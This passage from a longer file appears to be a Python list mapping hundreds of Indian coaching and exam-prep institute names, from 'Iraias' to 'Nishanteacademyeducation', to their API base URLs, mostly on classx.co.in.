    ("Iraias", "https://iraiasapi.classx.co.in"),
    ("Iriseacademy", "https://iriseacademyapi.classx.co.in"),
    ("Irshatech", "https://irshatechapi.classx.co.in"),
    ("Ischool24", "https://ischool24api.classx.co.in"),
    ("Itcorner", "https://itcornerapi.classx.co.in"),
    ("Itihasinstitution", "https://itihasinstitutionapi.classx.co.in"),
    ("Itpathshala", "https://itpathshalaapi.classx.co.in"),
    ("Itshaala", "https://itshaalaapi.classx.co.in"),
    ("Itspiderspune", "https://itspiderspuneapi.classx.co.in"),
    ("Ivaclasses", "https://ivaclassesapi.classx.co.in"),
    ("Jagrutawaaz", "https://jagrutawaazapi.classx.co.in"),
    ("Jagrutiacademy", "https://jagrutiacademyapi.classx.co.in"),
    ("Jaibharatonlineclasses", "https://jaibharatapi.classx.co.in"),
    ("Jaihostudy", "https://jaihostudyapi.classx.co.in"),
    ("Jaipalvishwakarma", "https://jaipalvishwakarmaapi.classx.co.in"),
    ("Jaipurcoachingcentre", "https://jaipurcoachingcentreapi.classx.co.in"),
    ("Javatechie", "https://javatechieapi.classx.co.in"),
    ("Jawaharnavodyavidhalaya", "https://jawaharnavodayvidhalayapraveshparikshaapi.classx.co.in"),
    ("Jayacademyfornursing", "https://jayacademyfornursingapi.classx.co.in"),
    ("Jaydurgamechanical", "https://jaydurgamechanicalapi.classx.co.in"),
    ("Jayramclasses", "https://jayramclassesapi.classx.co.in"),
    ("Jeeone", "https://jeeoneapi.classx.co.in"),
    ("Jeesankalplive", "https://jeesankalpliveapi.classx.co.in"),
    ("Jeeskool", "https://jeeskoolapi.classx.co.in"),
    ("Jeetendrakumar", "https://jeetendrakumarapi.classx.co.in"),
    ("Jeewithajay", "https://jeewithajayapi.classx.co.in"),
    ("Jescorer", "https://jescorerapi.classx.co.in"),
    ("Jhansiinstituteofcommerce", "https://jhansiinstitutecommerceapi.classx.co.in"),
    ("Jharpathshala", "https://jharpathshalaapi.classx.co.in"),
    ("Jhguru", "https://jhguruapi.classx.co.in"),
    ("Jiddpolicetrainingbymaheshsir", "https://jiddpolicetrainingapi.classx.co.in"),
    ("Jittisirclasses", "https://jittisirclassesapi.classx.co.in"),
    ("Jittuclasses", "https://jittuclassesapi.classx.co.in"),
    ("Jkcivilservices", "https://jkcivilservicesapi.classx.co.in"),
    ("Jkssbstudyfast", "https://jkssbstudyfastapi.classx.co.in"),
    ("Jkssbstudypoint", "https://jkssbstudypointapi.classx.co.in"),
    ("Jnanadegula", "https://jnanadegulaapi.classx.co.in"),
    ("Jobbadi", "https://jobbadiapi.classx.co.in"),
    ("Jobstarget", "https://jobstargetapi.classx.co.in"),
    ("Joshonlineexams", "https://joshonlineexamsapi.classx.co.in"),
    ("Jpiasacademy", "https://jpiasacademyapi.classx.co.in"),
    ("Jpmathsolutions", "https://jpmathsolutionsapi.classx.co.in"),
    ("Jrtutorials", "https://jrtutorialsapi.classx.co.in"),
    ("Jscafe", "https://jscafeapi.classx.co.in"),
    ("Jscivil", "https://jscivilapi.classx.co.in"),
    ("Jsyatra", "https://jsyatraapi.classx.co.in"),
    ("Jtc", "https://jtcapi.classx.co.in"),
    ("Jtcthelearningapp", "https://jawalateachingclassesapi.classx.co.in"),
    ("Judicialaddaexamprep", "https://judicialaddaexamprepapi.classx.co.in"),
    ("Jugalsirclasses", "https://jugalsirclassesapi.classx.co.in"),
    ("Junoon", "https://junoonapi.classx.co.in"),
    ("Juristest", "https://juristestapi.classx.co.in"),
    ("Justwellclasses", "https://justwellclassesapi.classx.co.in"),
    ("Jyotinagpal", "https://jyotinagpalapi.classx.co.in"),
    ("Kagr", "https://kagrapi.classx.co.in"),
    ("Kaivalyathewisdom", "https://kaivalyathewisdomapi.classx.co.in"),
    ("Kaizenacademy", "https://kaizenacademyapi.classx.co.in"),
    ("Kalamacademy", "https://kalamacademyapi.classx.co.in"),
    ("Kalamkranti", "https://kalamkrantiapi.classx.co.in"),
    ("Kalpenglishacademy", "https://kalpenglishacademyapi.classx.co.in"),
    ("Kalyanipublication", "https://kalyanipublicationapi.classx.co.in"),
    ("Kalyansenglishworld", "https://kalyansenglishworldapi.classx.co.in"),
    ("Kannadaacademy", "https://kannadaacademyapi.classx.co.in"),
    ("Kapilpahuja", "https://kapilpahujaapi.classx.co.in"),
    ("Karadcoachingclasses", "https://karadcoachingclassesapi.classx.co.in"),
    ("Karlapudikrishna", "https://karlapudikrishnaapi.classx.co.in"),
    ("Karnomatics", "https://karnomaticsapi.classx.co.in"),
    ("Kataralearning", "https://kataralearningapi.classx.co.in"),
    ("Katariaclassesnarnaul", "https://katariaclassesnarnaulapi.classx.co.in"),
    ("Kathaayurveda", "https://kathaayurvedaapi.classx.co.in"),
    ("Kauserclasses", "https://kauserclassesapi.classx.co.in"),
    ("Kautilyaacademy", "https://kautilyaacademyapi.classx.co.in"),
    ("Kautilyaacademysatara", "https://kautilyaacademysataraapi.classx.co.in"),
    ("Kautilyaalp", "https://kautilyaalpjeapi.classx.co.in"),
    ("Kautilyans", "https://kautilyansapi.classx.co.in"),
    ("Kaydepanditlawacademy", "https://kaydepanditlawacademyapi.classx.co.in"),
    ("Kazisironlinecoaching", "https://kazisironlinecoachingapi.classx.co.in"),
    ("Kccoaching", "https://kccoachingapi.classx.co.in"),
    ("Keertipurswani", "https://keertipurswaniapi.classx.co.in"),
    ("Kelvinlive", "https://kelvinliveapi.classx.co.in"),
    ("Kelwinthelearningapp", "https://kelwinlearningapi.classx.co.in"),
    ("Kendretestseries", "https://kendretestseriesapi.classx.co.in"),
    ("Keyofsuccess", "https://keyofsuccessapi.classx.co.in"),
    ("Kgf", "https://kgfapi.classx.co.in"),
    ("Kgmmission", "https://kgmmissionapi.classx.co.in"),
    ("Kgskautilyagroupofstudies", "https://kgskautilyagroupstudiesapi.classx.co.in"),
    ("Khantimethod", "https://khantimethodapi.classx.co.in"),
    ("Kharatacademy", "https://kharatacademyapi.classx.co.in"),
    ("Khuranastudyofficial", "https://khuranastudyofficialapi.classx.co.in"),
    ("Kico", "https://kicoappapi.classx.co.in"),
    ("Kinjallearning", "https://kinjallearningapi.classx.co.in"),
    ("Kiranacademy", "https://kiranacademyapi.classx.co.in"),
    ("Kiranguruji", "https://kirangurujiapi.classx.co.in"),
    ("Kiroshaacademy", "https://kiroshaacademyapi.classx.co.in"),
    ("Kiswacareeracademy", "https://kiswacareeracademyapi.akamai.net.in"),
    ("Kjwisdomclasses", "https://kjwisdomclassesapi.classx.co.in"),
    ("Kmdsaharanpur", "https://kmdsaharanpurapi.classx.co.in"),
    ("Kmenglishclasses", "https://kmenglishclassesapi.classx.co.in"),
    ("Knowledgeaccount", "https://knowledgeaccountapi.classx.co.in"),
    ("Knowledgebeam", "https://knowledgebeamapi.classx.co.in"),
    ("Knowledgebox", "https://knowledgeboxapi.classx.co.in"),
    ("Knowledgetopking20", "https://knowledgetopkingapi.classx.co.in"),
    ("Knrlogics", "https://knrlogicsapi.classx.co.in"),
    ("Komyaeducation", "https://komyaeducationapi.classx.co.in"),
    ("Konsacollegecollegesetu", "https://konsacollegeapi.classx.co.in"),
    ("Kotputlilaweducation", "https://kotputlilaweducationapi.classx.co.in"),
    ("Kpsirsbiologyclasses", "https://kpsirbiologyclassesapi.classx.co.in"),
    ("Kredozthelearningapp", "https://kredozlearningapi.classx.co.in"),
    ("Kreduhub", "https://kreduhubapi.classx.co.in"),
    ("Krishinteducation", "https://krishinteducationapi.classx.co.in"),
    ("Krishiparikshaicaribpsupsccuetexametc", "https://krishiparikshaapi.classx.co.in"),
    ("Krishnaclasses", "https://krishnaclassesapi.classx.co.in"),
    ("Krishnacoachingcentre", "https://krishnacoachingcentreapi.classx.co.in"),
    ("Krishnamindset", "https://krishnamindsetapi.classx.co.in"),
    ("Krisshhnachemistryclasses", "https://krisshnachemistryclassesapi.classx.co.in"),
    ("Krushikingsagriacademy", "https://krushikingsagriacademyapi.classx.co.in"),
    ("Krushnamacedmyrajkot", "https://krushnamacedmyrajkotapi.classx.co.in"),
    ("Kskeducare", "https://kskeducareapi.classx.co.in"),
    ("Ksquare", "https://ksquareapi.classx.co.in"),
    ("Ktdtonline", "https://ktdtonlineeducationapi.teachx.in"),
    ("Ktdtonlineeducation", "https://ktdtonlineeducationapi.classx.co.in"),
    ("Kumaredutainment", "https://kumaredutainmentapi.classx.co.in"),
    ("Kumawatgs", "https://kumawatgsapi.classx.co.in"),
    ("Kumawattarunsir", "https://kumawattarunsirapi.classx.co.in"),
    ("Kundankishore", "https://kundankishoreapi.classx.co.in"),
    ("Kvclasses", "https://kvclassesapi.classx.co.in"),
    ("Kvkfoundation", "https://kvkfoundationapi.classx.co.in"),
    ("Lakshacademy", "https://lakshacademyapi.classx.co.in"),
    ("Lakshmimaths", "https://lakshmimathsapi.classx.co.in"),
    ("Lakshya_appx", "https://lakshyaclassesapi.appx.co.in"),
    ("Lakshyaacademyahmednagar", "https://lakshyaacademyahmednagarapi.classx.co.in"),
    ("Lakshyaacademyjharkand", "https://lakshyaacademyjharkhandapi.classx.co.in"),
    ("Lakshyaclasses", "https://lakshyaclassesapi.classx.co.in"),
    ("Lakshyaclassesofficial", "https://lakshyaclassesofficialapi.classx.co.in"),
    ("Lakshyagyananant", "https://lakshyagyananantapi.classx.co.in"),
    ("Lakshyaias_cracker", "https://lakshyagscrackerapi.classx.co.in"),
    ("Lakshyaias", "https://lakshyaiasapi.classx.co.in"),
    ("Lakshyamarathi", "https://lakshyamarathiapi.classx.co.in"),
    ("Lakshyaras", "https://lakshyarasapi.classx.co.in"),
    ("Lastexam", "https://lastexamapi.classx.co.in"),
    ("Lastmomentpadhai", "https://lastmomentpadhaiapi.classx.co.in"),
    ("Lawchamps", "https://lawchampsapi.classx.co.in"),
    ("Lawislife", "https://lawlifeapi.classx.co.in"),
    ("Lawlectures", "https://lawlecturesapi.classx.co.in"),
    ("Lawshalabyhalfpacelearnatyourownpace", "https://lawshalaapi.classx.co.in"),
    ("Laxaneducation", "https://laxaneducationapi.classx.co.in"),
    ("Learn247", "https://learn247api.classx.co.in"),
    ("Learn4Exam", "https://learn4examapi.classx.co.in"),
    ("Learnamanbarkhastudylab", "https://learnamanbarkhaapi.classx.co.in"),
    ("Learnandshare", "https://learnshareapi.classx.co.in"),
    ("Learnbyinvestt", "https://learninvesttapi.classx.co.in"),
    ("Learncodewithtechnicalsuneja", "https://learncodetechnicalsunejaapi.classx.co.in"),
    ("Learnhistorybychauhansir", "https://learnhistorychauhansirapi.classx.co.in"),
    ("Learnindia", "https://learnindiaapi.classx.co.in"),
    ("Learningadda", "https://learningaddaapi.classx.co.in"),
    ("Learningclasses", "https://learningclassesapi.classx.co.in"),
    ("Learningloop", "https://learningloopapi.classx.co.in"),
    ("Learningpocket", "https://learningpocketapi.classx.co.in"),
    ("Learningtimetelugu", "https://learningtimeteluguapi.classx.co.in"),
    ("Learningzone", "https://learningzoneapi.classx.co.in"),
    ("Learnmantra", "https://learnmantraapi.classx.co.in"),
    ("Learnwithchirag", "https://learnchiragapi.classx.co.in"),
    ("Learnwithnatarajupsc", "https://learnwithnatarajupscapi.classx.co.in"),
    ("Learnwithpts", "https://learnwithptsapi.classx.co.in"),
    ("Learnwithsumit", "https://learnwithsumitapi.classx.co.in"),
    ("Learnwithsweety", "https://learnsweetyapi.classx.co.in"),
    ("Learnwithvipul", "https://learnwithvipulapi.classx.co.in"),
    ("Leaverageconsultants", "https://leverageconsultantsapi.classx.co.in"),
    ("Legalpathshalabykaransangwan", "https://legalpathshalakaransangwanapi.classx.co.in"),
    ("Lernax", "https://learnxapi.classx.co.in"),
    ("Letsimprove", "https://letsimproveapi.classx.co.in"),
    ("Letslearn", "https://letslearnappapi.classx.co.in"),
    ("Letslearnwithajaysir", "https://letslearnajaysirapi.classx.co.in"),
    ("Levelup", "https://levelupapi.classx.co.in"),
    ("Levelupenglishwithramani", "https://levelupenglishramaniapi.classx.co.in"),
    ("Librsclasses", "https://librsclassesapi.classx.co.in"),
    ("Lifeguru", "https://lifeguruapi.classx.co.in"),
    ("Lifeskillsbyalmost", "https://lifeskillsalmostapi.classx.co.in"),
    ("Lifetimecourses", "https://lifetimecoursesapi.classx.co.in"),
    ("Lifexcareer", "https://lifexcareerapi.classx.co.in"),
    ("Linkinglaws", "https://linkinglawsapi.classx.co.in"),
    ("Liso", "https://lisoclassesapi.classx.co.in"),
    ("Listenup", "https://listenupapi.classx.co.in"),
    ("Littlecodershub", "https://littlecodershubapi.classx.co.in"),
    ("Livedoubts", "https://livedoubtsapi.classx.co.in"),
    ("Livereasoningbyshobhitsir", "https://samarpanliveapi.classx.co.in"),
    ("Lngeducation", "https://lngeducationapi.classx.co.in"),
    ("Logicalmindeducation", "https://logicalmindapi.classx.co.in"),
    ("Loginstudy", "https://loginstudyapi.classx.co.in"),
    ("Lokmanyaias", "https://lokmanyaiasapi.classx.co.in"),
    ("Loksevaacademypublicationbook", "https://loksevaacademypublicationbookapi.classx.co.in"),
    ("Lol", "https://learnonlineapi.classx.co.in"),
    ("Lovebabbar", "https://lovebabarapi.classx.co.in"),
    ("Ltrammanoharsinghintercollege", "https://rammanoharsinghintercollegeapi.classx.co.in"),
    ("Lucidacademy", "https://lucidacademyapi.classx.co.in"),
    ("Luckyenglish", "https://luckyenglishapi.classx.co.in"),
    ("Lvclasses", "https://lvclassesapi.classx.co.in"),
    ("Lvclasseslive", "https://lvclassesapi.classx.co.in"),
    ("Lvias", "https://lviasapi.classx.co.in"),
    ("Maarulaclasses", "https://maarulaclassesapi.classx.co.in"),
    ("Madhuramhindipro", "https://madhuramhindiproapi.classx.co.in"),
    ("Madhurikhedekar", "https://madhurikhedekarapi.classx.co.in"),
    ("Madlearning", "https://madlearningapi.classx.co.in"),
    ("Magadhsciencecoaching", "https://magadhsciencecoachingapi.classx.co.in"),
    ("Maggamworks", "https://maggamworksapi.classx.co.in"),
    ("Mahabharti", "https://mahabhartiapi.classx.co.in"),
    ("Mahajyotidnyanjyoti", "https://mahajyotidnyanjyotiapi.classx.co.in"),
    ("Maharanapratapacademypune", "https://maharanapratapacademypuneapi.classx.co.in"),
    ("Maharanapratapdefenceacademy", "https://maharanapratapdefenceacademyapi.classx.co.in"),
    ("Maharashtraacademy", "https://maharashtraacademypuneapi.classx.co.in"),
    ("Maharashtraayurvedaacademy", "https://maharashtraayurvedaacademyapi.classx.co.in"),
    ("Maharashtraprabodhini", "https://maharashtraprabodhiniapi.classx.co.in"),
    ("Maharshiacademy", "https://maharshiacademyapi.classx.co.in"),
    ("Mahateacher", "https://mahateacherapi.classx.co.in"),
    ("Mahatestmpsc", "https://mahatestmpscapi.classx.co.in"),
    ("Mahatmajieducator", "https://mahatmajieducatorapi.classx.co.in"),
    ("Mahatmajitechnical", "https://mahatmajitechnicalapi.classx.co.in"),
    ("Mahaveersanskrit", "https://mahaveersanskritapi.classx.co.in"),
    ("Mahavirpublisheranddistributors", "https://mahavirpublisherdistributorsapi.classx.co.in"),
    ("Maheshpatil", "https://maheshpatilshashwatacademyapi.classx.co.in"),
    ("Maheshramharichobe", "https://maheshramharichobeapi.classx.co.in"),
    ("Maheshstudies", "https://maheshstudiesapi.classx.co.in"),
    ("Mahiyapathsala", "https://mahiyapathshalaapi.classx.co.in"),
    ("Mahiyapathshalaschool", "https://mahiyapathshalaschoolapi.classx.co.in"),
    ("Maithilboy", "https://maithilboyapi.classx.co.in"),
    ("Maitreyaupscmpsc", "https://maitreyaupscmpscapi.classx.co.in"),
    ("Majesticacademy", "https://majesticacademyapi.classx.co.in"),
    ("Makecareer", "https://makecareerapi.classx.co.in"),
    ("Makeiasofficial", "https://makeiasapi.classx.co.in"),
    ("Makeiteasy", "https://makeiteasyapi.classx.co.in"),
    ("Makeiteasyskills", "https://makeiteasyskillsapi.classx.co.in"),
    ("Malikdefenseacademy", "https://malikdefenseacademyapi.classx.co.in"),
    ("Malindatech", "https://malindatechapi.classx.co.in"),
    ("Mallamcreations", "https://mallamcreationsapi.classx.co.in"),
    ("Malukaias", "https://malukaiasapi.classx.co.in"),
    ("Mamtatechnicalclasses", "https://mamtatechnicalclassesapi.classx.co.in"),
    ("Manaacademy", "https://manaacademyapi.classx.co.in"),
    ("Manapatashala", "https://manapatashalaapi.classx.co.in"),
    ("Manasacademy", "https://manasacademyapi.classx.co.in"),
    ("Manasurjaayurveda", "https://manasurjaayurvedaapi.classx.co.in"),
    ("Manekshawofficersacademy", "https://manekshawofficersacademyapi.classx.co.in"),
    ("Mangaranilessons", "https://kmangaranilessonsapi.classx.co.in"),
    ("Mangilalchoudharysir", "https://mangilalchoudharysirapi.classx.co.in"),
    ("Manishacademylive", "https://manishacademyliveapi.classx.co.in"),
    ("Manishvermaclasses", "https://manishvermaclassesapi.classx.co.in"),
    ("Manojacademy", "https://manojacademyapi.classx.co.in"),
    ("Manojstudycentre", "https://manojstudycentreapi.classx.co.in"),
    ("Mansimahilaaudyogikutpadak", "https://mansimahilaaudyogikutpadaksahakarisocietyldtapi.classx.co.in"),
    ("Marathuvyakaran", "https://marathivyakarnapi.classx.co.in"),
    ("Margdarshanpathshala", "https://margdarshanpathshalaapi.classx.co.in"),
    ("Marshalcareeracademy", "https://marshalcareeracademyapi.classx.co.in"),
    ("Maryadaqualityeducation", "https://maryadaqualityeducationapi.classx.co.in"),
    ("Masterclassesiaspcs", "https://masterclassesiaspcsapi.classx.co.in"),
    ("Masterji", "https://masterjiapi.classx.co.in"),
    ("Mastermindsforcaandcma", "https://mastermindsforcaandcmaapi.classx.co.in"),
    ("Mastersahab", "https://mastersahabapi.classx.co.in"),
    ("Mathematicsstarclasses", "https://mathematicsstarclassesapi.classx.co.in"),
    ("Mathematicswithvishalkumar", "https://mathematicsvishalkumarapi.classx.co.in"),
    ("Mathreasoningbykadamsir", "https://mathreasoningkadamsirapi.classx.co.in"),
    ("Mathsbazaar", "https://mathsbazaarapi.classx.co.in"),
    ("Mathsbymrksir", "https://mathsmrksirapi.classx.co.in"),
    ("Mathsbynitinsir", "https://mathsnitinsirapi.classx.co.in"),
    ("Mathscare", "https://mathscareapi.classx.co.in"),
    ("Mathscaredigital", "https://mathscaredigitalapi.classx.co.in"),
    ("Mathsfied", "https://mathsfiedapi.classx.co.in"),
    ("Mathsguru", "https://mathsguruapi.classx.co.in"),
    ("Mathsimpact", "https://mathsimpactapi.classx.co.in"),
    ("Mathsjugadsemjs", "https://mathsjugadapi.classx.co.in"),
    ("Mathskiduniyavivekchoudhary", "https://mathskiduniyavivekchoudharyapi.classx.co.in"),
    ("Mathsmantra", "https://mathsmantraapi.classx.co.in"),
    ("Mathsmastibyvipinsir", "https://mathsmastivipinsirapi.classx.co.in"),
    ("Mathsmirror", "https://mathsmirrorapi.classx.co.in"),
    ("Mathsmrinmoysir_bad", "https://mathsmrinmoysirapi.classx.co"),
    ("Mathsphobia", "https://mathsphobiaapi.classx.co.in"),
    ("Mathsvalaashishkumar", "https://mathsvalaashishkumarapi.classx.co.in"),
    ("Mathsvatika20", "https://mathsvatikaappapi.classx.co.in"),
    ("Mathswalamaster", "https://mathswalamasterapi.classx.co.in"),
    ("Mathswithgajanand", "https://mathsgajanandapi.classx.co.in"),
    ("Mathswithmrinmoysir", "https://mathsmrinmoysirapi.classx.co.in"),
    ("Mathswithvivek", "https://mathsvivekapi.classx.co.in"),
    ("Mathwithpraveenbajpai", "https://mathpraveenbajpaiapi.classx.co.in"),
    ("Matsciodia", "https://matsciodiaapi.classx.co.in"),
    ("Maviacademy", "https://maviacademyapi.classx.co.in"),
    ("Mawanaclasses", "https://mawanaclassesapi.classx.co.in"),
    ("Maxenglishpoint", "https://maxenglishpointapi.classx.co.in"),
    ("Mayastheschoolofbeauty", "https://mayasschoolbeautyapi.classx.co.in"),
    ("Mayboliprabodhinipune", "https://mayboliprabodhiniapi.classx.co.in"),
    ("Mbnbyneerajkukreja", "https://mbnbyneerajkukrejaapi.classx.co.in"),
    ("Mcmaworldofengineering", "https://mcmaworldengineeringapi.classx.co.in"),
    ("Mcmpatna", "https://mcmpatnaapi.classx.co.in"),
    ("Mcsiasmissioncivilservices", "https://mcsiasapi.classx.co.in"),
    ("Md_appx", "https://mdclassesapi.appx.co.in"),
    ("Mdclasses", "https://mdclassesapi.classx.co.in"),
    ("Mdsir", "https://mdsirapi.classx.co.in"),
    ("Medicalandnurseshub", "https://medicalnurseshubapi.classx.co.in"),
    ("Medicalpathshala", "https://medicalpathshalaapi.classx.co.in"),
    ("Medinotes", "https://medinotesapi.classx.co.in"),
    ("Medsynapse", "https://medsynapseapi.classx.co.in"),
    ("Mehtaclasses", "https://mehraclassesapi.classx.co.in"),
    ("Mendesuresh", "https://mendesureshapi.classx.co.in"),
    ("Mentor365", "https://mentor365api.classx.co.in"),
    ("Mentormee", "https://mentormeeapi.classx.co.in"),
    ("Mentormeein", "https://mentormeeinapi.classx.co.in"),
    ("Mentorseduserve", "https://mentorseduserveapi.classx.co.in"),
    ("Menttifyin", "https://menttifyinapi.classx.co.in"),
    ("Meomadeeasy", "https://meomadeeasyapi.classx.co.in"),
    ("Meramentor", "https://meramentorapi.classx.co.in"),
    ("Meritova", "https://meritovaapi.classx.co.in"),
    ("Mgacademy", "https://mgacademyapi.classx.co.in"),
    ("Mgclasses", "https://mgclassesapi.classx.co.in"),
    ("Mgcollegemahwadausa", "https://mgcollegemahwadausaapi.classx.co.in"),
    ("Mgconcept", "https://mgconceptapi.classx.co.in"),
    ("Mgics", "https://mgicsappapi.classx.co.in"),
    ("Mgieducation", "https://mgieducationapi.classx.co.in"),
    ("Mgumangstudy", "https://mgumangstudyapi.classx.co.in"),
    ("Mheducationlab", "https://mheducationlabapi.classx.co.in"),
    ("Mheducationlablite", "https://mheducationlabliteapi.classx.co.in"),
    ("Mias", "https://miasappapi.classx.co.in"),
    ("Militaryjawan", "https://militaryjawanapi.classx.co.in"),
    ("Mindacademy", "https://mindacademyapi.classx.co.in"),
    ("Mindexam", "https://mindexamapi.classx.co.in"),
    ("Mindmentors", "https://mindmentorsapi.classx.co.in"),
    ("Mindsetfitness", "https://mindsetfitnessapi.classx.co.in"),
    ("Mindyourmathbykona", "https://mindyourmathbykonaapi.classx.co.in"),
    ("Minilibrary", "https://minilibraryapi.classx.co.in"),
    ("Mishthiclassesjaipur", "https://mishthiclassesjaipurapi.classx.co.in"),
    ("Mission_appx", "https://missionapi.appx.co.in"),
    ("Mission", "https://missionapi.classx.co.in"),
    ("Missionbadlav", "https://missionbadlavapi.classx.co.in"),
    ("Missiondreameducation", "https://missiondreameducationapi.classx.co.in"),
    ("Missionhigh", "https://missionhighapi.classx.co.in"),
    ("Missionkhakionlinelearningapp", "https://missionkhakiapi.classx.co.in"),
    ("Mitexa", "https://mitexaapi.classx.co.in"),
    ("Mjshaikhsenglishacademy", "https://mjshaikhsenglishacademyapi.classx.co.in"),
    ("Mkeducare", "https://mkeducareapi.classx.co.in"),
    ("Mkgyankendra", "https://mkgyankendraapi.classx.co.in"),
    ("Mkmadhavmaths", "https://mkmadhavmathsapi.classx.co.in"),
    ("Mkphysicsclasses", "https://mkphysicsclassesapi.classx.co.in"),
    ("Mksir", "https://mksirapi.classx.co.in"),
    ("Mme", "https://missionmillionenglishapi.classx.co.in"),
    ("Mobileparschool", "https://mobileparschoolapi.classx.co.in"),
    ("Mobishiksha", "https://mobishikshaapi.classx.co.in"),
    ("Mockopedia", "https://mockopediaapi.classx.co.in"),
    ("Mocksadda", "https://mocksaddaapi.classx.co.in"),
    ("Mocksguru", "https://mocksguruapi.classx.co.in"),
    ("Modelmaths", "https://modelmathsapi.classx.co.in"),
    ("Modulationdigital", "https://modulationdigitalapi.classx.co.in"),
    ("Mohandrivezone", "https://mohandrivezoneapi.classx.co.in"),
    ("Moneyfundas", "https://moneyfundasapi.classx.co.in"),
    ("Mpscbyeknathpatiltatya", "https://mpscbyeknathpatiltatyaapi.classx.co.in"),
    ("Mpscguru", "https://mpscguruapi.classx.co.in"),
    ("Mpsclakshya", "https://mpsclakshyaapi.classx.co.in"),
    ("Mpscmadesimple", "https://mpscmadesimpleapi.classx.co.in"),
    ("Mpscmaza", "https://mpscmazaapi.classx.co.in"),
    ("Mpscmentor", "https://mpscmentorapi.classx.co.in"),
    ("Mpscpocketapp", "https://mpscpocketappapi.classx.co.in"),
    ("Mpscstudypoint", "https://mpscstudypointapi.classx.co.in"),
    ("Mrcompetitiveeasylearning", "https://mrcompetitiveeasylearningapi.classx.co.in"),
    ("Mreducare", "https://mreducareapi.classx.co.in"),
    ("Msaclasses", "https://msaclassesapi.classx.co.in"),
    ("Mschool", "https://mschoolapi.classx.co.in"),
    ("Msclasses", "https://msclassesapi.classx.co.in"),
    ("Mseducations", "https://mseducationsapi.classx.co.in"),
    ("Msgurustudy", "https://msgurustudyapi.classx.co.in"),
    ("Mssscnotes", "https://mseducationapi.classx.co.in"),
    ("Mssuccess", "https://mssuccessapi.classx.co.in"),
    ("Mtphysicsclasses", "https://mtphysicsclassesapi.classx.co.in"),
    ("Muditguptaupscprepplatform", "https://muditguptaprepplatformapi.classx.co.in"),
    ("Mukeshpancholiacharyaclasses", "https://acharyaclassesapi.classx.co.in"),
    ("Mukulagrawal", "https://mukulagrawalapi.classx.co.in"),
    ("Murthysenglish", "https://murthyenglishapi.classx.co.in"),
    ("Mvrsuccess", "https://mvrsuccessapi.classx.co.in"),
    ("Mybizkid", "https://mybizkidapi.classx.co.in"),
    ("Myclass", "https://myclassapi.classx.co.in"),
    ("Mycoachingofficialapp", "https://mycoachingofficialappapi.classx.co.in"),
    ("Myenglishiqacademy", "https://myenglishiqacademyapi.classx.co.in"),
    ("Myexam", "https://myexamappapi.classx.co.in"),
    ("Myexamdiary", "https://myexamdiaryapi.classx.co.in"),
    ("Mymentor", "https://mymentorappapi.classx.co.in"),
    ("Mynotes", "https://mynotesapi.classx.co.in"),
    ("Mysaksham", "https://mysakshamapi.classx.co.in"),
    ("Myschool", "https://myschoolapi.classx.co.in"),
    ("Mytestlibrary", "https://mytestlibraryapi.classx.co.in"),
    ("Myupscclass", "https://myupscclassapi.classx.co.in"),
    ("Myvidyarthi", "https://myvidyarthiapi.classx.co.in"),
    ("Naiduexamwarriors", "https://naiduexamwarriorsapi.classx.co.in"),
    ("Naiyapaareducation", "https://naiyapaareducationapi.classx.co.in"),
    ("Nalandaclasses", "https://nalandaclassesapi.classx.co.in"),
    ("Nallurirajeshsirclasses", "https://nallurirajeshsirclassesapi.classx.co.in"),
    ("Namanneducation", "https://namanneducationapi.classx.co.in"),
    ("Namansirmaths", "https://namansirmathsapi.classx.co.in"),
    ("Namastelearning", "https://namastelearningapi.classx.co.in"),
    ("Namasteneetjee", "https://namasteneetjeeapi.classx.co.in"),
    ("Namastesql", "https://namastesqlapi.classx.co.in"),
    ("Namisha_appx", "https://nimishabansalapi.appx.co.in"),
    ("Namoabcacademy", "https://namoabcacademyapi.classx.co.in"),
    ("Nannampoleclimbing", "https://nannampoleclimbingapi.classx.co.in"),
    ("Narayanansirstudycircles", "https://narayanansirstudycirclesapi.classx.co.in"),
    ("Narendrasirsacademy", "https://narendrasiracademyapi.classx.co.in"),
    ("Nareshonlineacademy", "https://nareshonlineacademyapi.classx.co.in"),
    ("Nathpublication", "https://nathpublicationapi.classx.co.in"),
    ("Natrajeducation", "https://natrajeducationapi.classx.co.in"),
    ("Naukriaspirants", "https://naukriaspirantsapi.classx.co.in"),
    ("Naukrijunction", "https://naukrijunctionapi.classx.co.in"),
    ("Naveenreddymath", "https://naveenreddymathapi.classx.co.in"),
    ("Naveentanwaracademy", "https://naveentanwaracademyapi.classx.co.in"),
    ("Navjeevanonlinecampus", "https://navjeevanonlinecampusapi.classx.co.in"),
    ("Navtutor", "https://navtutorapi.classx.co.in"),
    ("Navyugstudyforum", "https://navyugstudyforumapi.classx.co.in"),
    ("Nawala", "https://nawalaapi.classx.co.in"),
    ("Nayanclasses20", "https://nayanclassesapi.classx.co.in"),
    ("Ndcampusthelearningapp", "https://ndcampuslearningapi.classx.co.in"),
    ("Neelamnaidustudycircle", "https://neelamnaidustudycircleapi.classx.co.in"),
    ("Neerajsharmaenglishnew", "https://neerajsharmaenglishapi.classx.co.in"),
    ("Neerajsharmaenglishold", "https://sharmasapi.classx.co.in"),
    ("Neeteasy", "https://neeteasyapi.classx.co.in"),
    ("Neetkakajee", "https://neetkakajeeapi.classx.co.in"),
    ("Neetpathshala", "https://neetpathshalaapi.classx.co.in"),
    ("Neetphysicskota", "https://neetphysicskotaapi.akamai.net.in"),
    ("Neetshastraneetcounselling", "https://neetshastraneetcounsellingapi.classx.co.in"),
    ("Neocollege", "https://neocollegeapi.classx.co.in"),
    ("Neospark", "https://neosparkapi.classx.co.in"),
    ("Newatulyaacademy", "https://newatulyaacademyapi.classx.co.in"),
    ("Newlightclasses", "https://newlightclassesapi.classx.co.in"),
    ("Newutkarshiaspcscoaching", "https://newutkarshcoachingapi.classx.co.in"),
    ("Nexteducation", "https://nexteducationapi.classx.co.in"),
    ("Nglearner", "https://nglearnersapi.classx.co.in"),
    ("Nglearner_dup", "https://nglearnersapi.classx.co.in"),
    ("Nhmiracleacademy", "https://nhmiracleacademyapi.classx.co.in"),
    ("Niceacademyhaveri", "https://niceacademyhaveriapi.classx.co.in"),
    ("Nicevidyapeeth", "https://nicevidyapeethapi.classx.co.in"),
    ("Nileshclasses", "https://nileshclassesapi.classx.co.in"),
    ("Nirakt", "https://niraktapi.classx.co.in"),
    ("Nirdeshiasclasses", "https://nirdeshiasclassesapi.classx.co.in"),
    ("Nirmanias", "https://nirmaniasapi.classx.co.in"),
    ("Niseeducationhub", "https://niseeducationhubapi.classx.co.in"),
    ("Nishanteacademyeducation", "https://nishanteacademyeducationapi.classx.co.in"),
